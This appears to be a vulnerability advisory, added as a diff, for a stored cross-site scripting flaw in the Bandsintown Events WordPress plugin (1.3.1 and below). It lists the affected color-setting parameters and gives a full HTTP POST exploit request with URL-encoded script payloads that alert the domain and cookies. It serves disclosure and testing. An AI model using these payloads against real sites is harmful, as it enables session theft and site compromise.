@@ -1,0 +1,39 @@
+XSS vulnerability in Bandsintown Events Plugin for WordPress
+
+# Product : Bandsintown Events
+# Affected Versions : 1.3.1 and possibly below
+# Product URL : https://wordpress.org/plugins/bandsintown/
+# Developer : https://www.bandsintown.com/
+
+# Exploit Author : Harinarayanan (harinarayanan.dhamo@gmail.com)
+   LinkedIn : https://www.linkedin.com/in/harinarayanan-d-49718357
+# Vulnerability Type : CWE-83 [XSS]
+# Discovered Date : 27-03-2020
+# CVE Status : Fresh
+
+#About Plugin
+Bandsintown's Events plugin makes it easy for artists to showcase their upcoming events anywhere on their WordPress-powered blog or website.
+
+#Vulnerable Description
+Improper Neutralization of Script in Attributes in a Web Page[CWE-83]
+#Vulnerable params 
+bitp_options[text_color]
+bitp_options[background_color]
+bitp_options[button_and_link_color]
+bitp_options[link_text_color] 
+
+#Exploit Request 
+POST /wordpress_new/wordpress/wp-admin/options.php HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress_new/wordpress/wp-admin/options-general.php?page=bandsintown-settings
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 723
+Origin: http://localhost
+Connection: close
+Cookie: wp-settings-1=editor%3Dhtml; wp-settings-time-1=1584884251; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_xyx=adminxyz
+Upgrade-Insecure-Requests: 1
+
+option_page=plugin_options&action=update&_wpnonce=aa8621588d&_wp_http_referer=%2Fwordpress_new%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dbandsintown-settings%26settings-updated%3Dtrue&bitp_options%5Bartist%5D=test&bitp_options%5Btext_color%5D=%23000%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&bitp_options%5Bbackground_color%5D=%23fff%22%3E%3Cscript%3Ealert%28document.path%29%3B%3C%2Fscript%3E&bitp_options%5Bbutton_and_link_color%5D=%232f95de%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&bitp_options%5Blink_text_color%5D=%23fff%22%3E%3Cscript%3Ealert%28%27Hari%27%29%3B%3C%2Fscript%3E&bitp_options%5Bdisplay_limit%5D=15&bitp_options%5Bcustom_css%5D=++&Submit=Save+Settings
